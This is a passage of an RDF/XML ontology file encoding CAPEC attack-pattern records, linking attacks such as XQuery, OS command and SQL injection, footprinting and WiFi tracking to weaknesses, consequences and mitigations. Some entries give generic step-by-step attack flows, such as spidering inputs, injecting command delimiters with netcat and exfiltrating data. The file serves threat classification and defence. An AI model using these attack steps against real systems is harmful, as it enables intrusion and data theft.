            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::707::149::177::838::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Monitor connections  checking headers in traffic for contradictory domain names  or empty domain names.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack5">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#481">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:161::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Contradictory Destinations in Traffic Routing Schemes"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Perform input white list validation on all XML input::Implementation: Run xml parsing and query infrastructure with minimal privileges so that an attacker is limited in their ability to probe other system resources from XQL.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack479">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#84">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:250::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XQuery Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::74::713::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application for user-controllable inputs) Using a browser or an automated tool  an attacker follows all public links and actions on a web site. He records all the links  the forms  the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine user-controllable input susceptible to injection) Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection  attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data  TamperIE  WebScarab etc. to modify HTTP POST parameters  hidden fields  non-freeform fields  etc.:TECHNIQUE:Use XML files to inject input.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Exploit:DESCRIPTION:(Information Disclosure) The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase  inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.::STEP:4:PHASE:Exploit:DESCRIPTION:(Manipulate the data in the XML database) The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase  inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker402">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#612">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#WiFi MAC Address Tracking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack402">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#612"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::201::300::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::300::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Open source and commercial software tools are available and several commercial advertising companies routinely set up tools to collect and monitor MAC addresses.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Automatic randomization of WiFi MAC addresses::Frequent changing of handset and retransmission device::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack402"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Apply the principle of least privilege.::Validate all untrusted data.::Apply the latest patches.::Scan your services and disable the ones which are not needed and are exposed unnecessarily. Exposing programs increases the attack surface. Only expose the services which are needed and have security mechanisms such as authentication built around them.::Avoid revealing information about your system (e.g.  version of the program) to anonymous users.::Make sure that your program or service fail safely. What happen if the communication protocol is interrupted suddenly? What happen if a parameter is missing? Does your system have resistance and resilience to attack? Fail safely when a resource exhaustion occurs.::If possible use a sandbox model which limits the actions that programs can take. A sandbox restricts a program to a set of privileges and commands that make it difficult or impossible for the program to cause any damage.::Check your program for buffer overflow and format String vulnerabilities which can lead to execution of malicious code.::Monitor traffic and resource usage and pay attention if resource exhaustion occurs.::Protect your log file from unauthorized modification and log forging.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack466">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#69">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:233::NATURE:CanPrecede:CAPEC ID:8::NATURE:CanPrecede:CAPEC ID:9::NATURE:CanPrecede:CAPEC ID:10::NATURE:CanPrecede:CAPEC ID:67::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Target Programs with Elevated Privileges"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::250::264::15::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker probes for programs running with elevated privileges.::STEP:2:PHASE:Explore:DESCRIPTION:The attacker finds a bug in a program running with elevated privileges.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker exploits the bug that she has found. For instance she can try to inject and execute arbitrary code or write to OS resources.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker9">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#642">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Replace Binaries"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack9">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#642"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::732::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to place the malicious binary on the target machine.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker69">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#169">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Footprinting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack69">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#169"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Request Footprinting) The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.TECHNIQUE:Open Source Footprinting: Examine the website about the organization and skim through the webpage&apos;s HTML source to look for comments.:TECHNIQUE:Network Enumeration: Perform various queries (Registrar Query  Organizational Query  Domain Query  Network Query  POC Query) on the many whois databases found on the internet to identify domain names and associated networks.:TECHNIQUE:DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.:TECHNIQUE:Other Techniques: Use ping sweep  TCP scan  UDP scan  OS Identification various techniques to gain more information about the system and network.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g.  if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However  some configuration choices may limit the useful information that can be collected during a footprinting attack.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary knows how to send HTTP request  run the scan tool.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker401">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#613">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#WiFi SSID Tracking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack401">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#613"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::300::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::300::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Open source and commercial software tools are available and open databases of known WiFi SSID addresses are available online.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker180">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#448">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:442::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Embed Virus into DLL"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack180">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#448"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn&apos;t normally have.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker408">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#276"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack408"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::707::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker4">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#465">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:554::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Transparent Proxy Abuse"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack4">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#465"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::441::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::441::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Transparent proxy is usedVulnerable configuration of network topology involving the transparent proxy (e.g.  no NAT happening between the client and the proxy)Execution of malicious Flash or Applet in the victim&apos;s browser::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Creating malicious Flash or Applet to open a cross-domain socket connection to a remote system:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted  they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)::Design: Execute programs with constrained privileges  so parent process does not open up further vulnerabilities. Ensure that all directories  temporary directories and files  and memory are executing with limited privileges to protect against remote execution.::Design: Proxy communication to host  so that communications are terminated at the proxy  sanitizing the requests before forwarding to server host.::Implementation: Virus scanning on host::Implementation: Host integrity monitoring for critical files  directories  and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack217">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#23">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:242::NATURE:CanAlsoBe:CAPEC ID:165::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#File Content Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::20::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack512">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#461">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:115::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Web Services API Signature Forgery Leveraging Hash Function Extension Weakness"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::328::290::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker3">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#195"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack3"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must associate data or activities with a person&apos;s identity and the adversary must be able to modify this identity without detection.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker407">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#88">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#OS Command Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack407">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#88"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::78::88::20::697::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify inputs for OS commands) The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.TECHNIQUE:Port mapping. Identify ports that the system is listening on  and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses  he attempts to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:(Survey the Application) The attacker surveys the target application  possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:(Vary inputs  looking for malicious results.) Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input  containing OS commands  to be passed to the applicationTECHNIQUE:Inject command delimiters using network packet injection tools (netcat  nemesis  etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies  TamperData  custom programs  etc.)::STEP:4:PHASE:Exploit:DESCRIPTION:(Execute malicious commands) The attacker may steal information  install a back door access mechanism  elevate privileges or compromise the system in some other way.TECHNIQUE:The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).:TECHNIQUE:The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).:TECHNIQUE:The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::78::88::20::697::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User controllable input used as part of commands to the underlying operating system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve  though not always  knowledge of specific assembly commands for the platform.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION  SELECT or INSERT must be filtered in addition to characters such as a single-quote(&apos;) or SQL-comments (--) based on the context in which they appear.::Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains  such as strings or integers  and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack449">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#66">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#SQL Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::89::74::20::697::713::707::"/>
        </j.0:exploits>
        <j.0:executes>
